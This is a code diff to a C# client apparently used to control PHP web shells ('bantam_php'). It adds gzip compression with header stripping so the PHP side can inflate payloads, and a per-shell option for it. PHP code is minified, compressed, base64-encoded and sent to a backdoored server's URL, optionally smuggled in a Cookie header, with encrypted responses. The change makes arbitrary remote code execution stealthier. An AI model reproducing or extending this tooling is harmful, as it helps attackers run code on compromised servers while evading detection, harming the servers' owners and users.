@@ -6,6 +6,11 @@ using System.Threading.Tasks;
 using System.Net;
 using SocksSharp;
 using SocksSharp.Proxy;
+using System.Text;
+using System.IO;
+using System.IO.Compression;
+using System.Windows.Forms;
+using System.Net.Http.Headers;
 
 namespace bantam_php
 {
@@ -109,7 +114,7 @@ namespace bantam_php
             } catch (System.Net.Http.HttpRequestException) {
             
             }
-            return "";
+            return string.Empty;
         }
 
         /// <summary>
@@ -131,7 +136,27 @@ namespace bantam_php
             } catch (System.Net.Http.HttpRequestException) {
 
             }
-            return "";
+            return string.Empty;
+        }
+
+        public static byte[] Compress(byte[] input)
+        {
+            using (var result = new MemoryStream()) {
+                var lengthBytes = BitConverter.GetBytes(input.Length);
+                result.Write(lengthBytes, 0, 4);
+
+                using (var compressionStream = new GZipStream(result,
+                    CompressionMode.Compress)) {
+                    compressionStream.Write(input, 0, input.Length);
+                    compressionStream.Flush();
+                }
+
+                //strip header so php can use "gzinflate"
+                Byte[] compressedBytes = result.ToArray();
+                Byte[] bytesWithoutHeader = new Byte[compressedBytes.Length - 14];
+                Buffer.BlockCopy(compressedBytes, 14, bytesWithoutHeader, 0, bytesWithoutHeader.Length);
+                return bytesWithoutHeader;
+            }
         }
 
         /// <summary>
@@ -148,6 +173,7 @@ namespace bantam_php
             string requestArgsName = BantamMain.Shells[url].requestArgName;
             bool sendViaCookie = BantamMain.Shells[url].sendDataViaCookie;
             int responseEncryptionMode = BantamMain.Shells[url].responseEncryptionMode;
+            bool gzipRequestData = BantamMain.Shells[url].gzipRequestData;
 
             try {
                 HttpMethod method;
@@ -160,13 +186,23 @@ namespace bantam_php
 
                 var request = new HttpRequestMessage(method, url);
 
+                //HttpClientHandler handler = new HttpClientHandler();
+                //handler.AutomaticDecompression = System.Net.DecompressionMethods.GZip;
+
                 if (!string.IsNullOrEmpty(code)) {
                     if (encryptResponse) {
                         code += PhpHelper.EncryptPhpVariableAndEcho(responseEncryptionMode, ref encryptionKey, ref encryptionIV);
                     }
+
                     string minifiedCode = Helper.MinifyCode(code);
-                    string b64EncodedCode = Helper.EncodeBase64ToString(minifiedCode);
-                   
+                    byte[] originalBytes = Encoding.UTF8.GetBytes(minifiedCode);
+
+                    if (gzipRequestData) {
+                        originalBytes = Compress(originalBytes);
+                    }
+
+                    string b64EncodedCode = Convert.ToBase64String(originalBytes);
+
                     if (sendViaCookie) {
                         string urlEncodedCode = HttpUtility.UrlEncode(b64EncodedCode);
                         request.Headers.TryAddWithoutValidation("Cookie", requestArgsName + "=" + urlEncodedCode);
